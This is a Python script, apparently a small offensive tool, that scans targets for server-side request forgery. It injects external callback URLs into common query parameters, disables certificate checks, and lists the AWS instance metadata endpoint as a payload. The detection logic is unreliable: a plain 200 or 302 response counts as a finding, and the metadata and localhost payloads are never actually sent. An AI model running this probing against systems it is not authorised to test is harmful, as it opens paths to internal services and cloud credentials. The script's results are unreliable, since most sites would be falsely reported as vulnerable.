#!/usr/bin/env python3
print('[SSRF Scanner - Interactive tool for detecting Server-Side Request Forgery]')
import requests, sys, os
requests.packages.urllib3.disable_warnings()

BANNER = '''
SSRF Scanner - Server-Side Request Forgery Detection
- Blind SSRF via external callbacks
- Semi-blind via response timing/content
- Full SSRF via internal service access
'''

COLLABORATORS = [
    'http://burpcollaborator.net',
    'https://webhook.site',
    'http://localhost:8080',
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata
]

def scan_ssrf(target):
    base = f"https://{target}" if not target.startswith("http") else target
    base = base.rstrip("/")
    results = {"target": target, "vulnerable": False, "findings": []}
    
    ssrf_params = ["url", "file", "load", "redirect", "uri", "path", "dest", "return", "page", "feed", "host", "image", "img"]
    
    for param in ssrf_params:
        for collab in COLLABORATORS[:2]:
            try:
                url = f"{base}?{param}={requests.utils.quote(collab)}"
                r = requests.get(url, timeout=10, verify=False,
                    headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code in [200, 302] or "localhost" in r.text or "metadata" in r.text:
                    results["vulnerable"] = True
                    results["findings"].append(f"[SSRF] {param}={collab} ({r.status_code})")
            except: pass
    
    return results

def main():
    print(BANNER)
    if len(sys.argv) < 2:
        print("Usage: python3 ssrf_scanner.py <target|file>")
        sys.exit(1)
    targets = [sys.argv[1]] if not os.path.isfile(sys.argv[1]) else [l.strip() for l in open(sys.argv[1]) if l.strip()]
    for t in targets:
        r = scan_ssrf(t)
        if r["vulnerable"]:
            print(f"[!!] {t}")
            for f in r["findings"]: print(f"     {f}")

if __name__ == "__main__":
    main()
